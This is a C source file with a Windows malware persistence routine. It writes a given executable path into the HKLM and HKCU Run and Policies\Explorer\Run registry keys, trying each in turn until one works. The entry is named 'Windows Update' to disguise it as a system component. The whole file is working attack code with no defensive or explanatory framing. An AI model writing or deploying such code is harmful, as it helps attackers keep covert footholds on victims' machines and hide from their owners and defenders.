#include <stdio.h>
#include <string.h>
#include <windows.h>

int persistence(char *destinationPath) {
    HKEY hKey;
    DWORD dwDisposition;

    HKEY rootKeys[] = {
        HKEY_LOCAL_MACHINE,
        HKEY_LOCAL_MACHINE,
        HKEY_CURRENT_USER,
        HKEY_CURRENT_USER
    };

    const char *regPaths[] = {
        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run",
        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
        "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run",
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    };

    const int numOfPaths = sizeof(regPaths) / sizeof(regPaths[0]);

    int isSuccessful = 0;

    for (int i = 0; i < numOfPaths; i++) {
        printf("Trying path %d...\n", i + 1);

        LONG result = RegCreateKeyExA(
            rootKeys[i],
            regPaths[i],
            0,
            NULL,
            REG_OPTION_NON_VOLATILE,
            KEY_WRITE,
            NULL,
            &hKey,
            &dwDisposition
        );

        if (result == ERROR_SUCCESS) {
            if (dwDisposition == REG_CREATED_NEW_KEY) {
                printf("  New key created!\n");
            }
            else {
                printf("  The existing key was opened!\n");
            }

            LONG setRes = RegSetValueExA(hKey, "Windows Update", 0, REG_SZ, (const BYTE *)destinationPath, (DWORD)(strlen(destinationPath) + 1));

            if (setRes == ERROR_SUCCESS) {
                printf("  Persistence Successful on this path -> %s\n\n", regPaths[i]);
                isSuccessful = 1;
                RegCloseKey(hKey);
                break;
            }
            else {
                printf("  Failed to set registry value! Error Code: %ld\n", setRes);
            }

            RegCloseKey(hKey);
        }
        else {
            printf("  Persistence Failed! Error Code: %ld", result);
            if (result == ERROR_ACCESS_DENIED) {
                printf(", Run as Administrator or lack of permissions!\n\n");
            }
            else {
                printf("\n");
            }
        }
    }

    if (isSuccessful) {
        printf("Overall Process: SUCCESS!\n\n");
    }
    else {
        printf("Overall Process: FAILED on all paths!\n\n");
    }

    return 0;
}
